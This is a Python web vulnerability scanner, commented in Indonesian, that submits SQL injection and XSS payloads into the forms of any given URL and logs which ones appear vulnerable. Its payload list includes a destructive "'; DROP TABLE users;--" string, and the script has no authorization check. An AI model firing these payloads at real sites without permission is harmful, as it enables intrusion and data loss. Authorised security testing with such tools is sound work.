import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import random
from datetime import datetime
import sys
import os

# SQLI payloads
sql_payloads = ["'", "\"", "'; DROP TABLE users;--"]
xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]

def setup_logger(url):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M")
    domain = url.split("//")[-1].split("/")[0]
    
    if not os.path.exists("scan_reports"):
        os.makedirs("scan_reports")
    log_filename = f"scan_reports/scan_report_{domain}_{timestamp}.log"

    class Logger:
        def __init__(self, filename):
            self.terminal = sys.stdout
            self.log = open(filename, "w")
        def write(self, message):
            self.terminal.write(message)
            self.log.write(message)
        def flush(self):
            pass

    sys.stdout = Logger(log_filename)
    print(f"{'='*50}")
    print(f"Scan Report - {datetime.now().strftime('%Y-%m-%d %H:%M')}")
    print(f"Target URL: {url}")
    print(f"{'='*50}\n")

def get_forms(url):
    """"Mengambil semua form dari halaman web."""
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        return soup.find_all('form')
    except Exception as e:
        print(f"[!] Error fetching forms from {url}: {e}")
        return []
    
def form_details(form):
    """Extrak detail dari form."""
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()

    inputs = []
    for tag in form.find_all("input"):
        name = tag.attrs.get("name")
        type_tag = tag.attrs.get("type", "text")
        if name:
            inputs.append({"name": name, "type": type_tag})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, payload):
    """Kirim form dengan payload tertentu."""
    target_url = urljoin(url, form_details["action"])
    data = {}

    for input in form_details["inputs"]:
        if input["type"] == "text" or input["type"] == "search":
            data[input["name"]] = payload
        else:
            data[input["name"]] = "test"

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)
    
def check_sqli(url):
    """Cek kerentanan SQL injection."""
    print("[*] Checking SQL Injecction.....")
    forms = get_forms(url)
    for form in forms:
        details = form_details(form)
        for payload in sql_payloads:
            response = submit_form(details, url, payload)
            errors = {
                "you have an error in your sql syntax",
                "warning: mysql",
                "unclosed quotation mark after character string",
                "quote string not properly terminated"
            }
            for error in errors:
                if error in response.text.lower():
                    print(f"[+] SQL ditemukan di {url}")
                    print(f"[*] form dengnan input: {details['inputs']}")
                    return True
    print("[-] Tidak ditemukan kerentanan SQLI.")
    return False
    
def check_xss(url):
    """Cek kerentanan XSS"""
    print("[*] checking XSS....")
    forms = get_forms(url)
    for form in forms:
        details = form_details(form)
        for payload in xss_payloads:
            response = submit_form(details, url, payload)
            if payload in response.text:
                print(f"[+] XSS ditemukan di {url}")
                print(f"[*] Form dengan input: {details['inputs']}")
                return True
    print("[-] Tidak ditemukan kerentanan XSS.")
    return False

def scan_website(url):
    """Fungsi untuk menjalankan scanner."""
    print(f"[*] Memulai pemindaian terhadap {url}")
    print(f"Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M')}")
    print(f"{'='*50}")
    sqli_found = check_sqli(url)
    xss_found = check_xss(url)
    print("\n" + "="*50)
    print("HASIL PEMINDAIAN AKHIR")
    print("="*50)
    print(f"SQL Injection: {'Ditemukan' if sqli_found else 'Tidak ditemukan'}")
    print(f"XSS: {'Ditemukan' if xss_found else 'Tidak ditemukan'}")
    print("="*50)
    print("[*] Pemindaian selesai.\n")

if __name__ == "__main__":
        if len(sys.argv) > 1:
            target_url = sys.argv[1]
        else:
            target_url = input("Masukkan URL website yang akan di scan:")
        
        setup_logger(target_url)
        scan_website(target_url)   